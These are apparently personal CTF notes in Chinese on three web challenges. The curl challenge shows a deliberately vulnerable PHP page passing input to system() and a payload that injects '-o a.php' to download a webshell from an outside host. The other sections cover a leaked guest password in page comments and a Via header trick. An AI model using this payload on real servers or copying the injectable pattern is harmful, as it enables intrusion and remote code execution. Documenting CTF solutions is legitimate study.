- > 只记录非常规题
- # ctf_curl
	- 这题不是RCE，直接用curl从服务器上面下webshell就好了
	- 题目
		- ```php
		  <?php
		  highlight_file('index.php');
		  // curl your domain
		  // flag is in /tmp/Syclover
		  
		  if (isset($_GET['addr'])) {
		      $address = $_GET['addr'];
		      if(!preg_match("/;|f|:|\||\&|!|>|<|`|\(|{|\?|\n|\r/i", $address)){
		          $result = system("curl ".$address."> /dev/null");
		      } else {
		          echo "Hacker!!!";
		      }
		  }
		  ?>
		  ```
	- payload: `/?addr=xxx.xx/a.txt+-o+a.php`
- # flag 保卫战
	- 信息泄漏
		- ```js
		  
		      // 访客密码  password 123456
		      // /flag?pass=123456
		      $(document).ready(function() {
		          $('#loginForm').on('submit', function(e) {
		              e.preventDefault();
		              const username = $('#username').val();
		              const password = $('#password').val();
		              $.ajax({
		                  url: '/login',  // your login API endpoint
		                  type: 'POST',
		                  contentType: 'application/json',
		                  data: JSON.stringify({
		                      'username': username,
		                      'password': password
		                  }),
		                  success: function(data, textStatus, xhr) {
		                      if (xhr.status === 200) {
		                          // handle successful login here
		                          window.location.href = "/upload";
		                      }
		                  },
		                  error: function(xhr, textStatus, error) {
		                      if (xhr.status === 401) {
		                          document.getElementById("error-message").textContent = "用户名或密码错误";
		                      }
		                  }
		              });
		          });
		      });
		  
		  ```
- # EzHttp
	- 代理的HTTP header: `Via: xxx.com`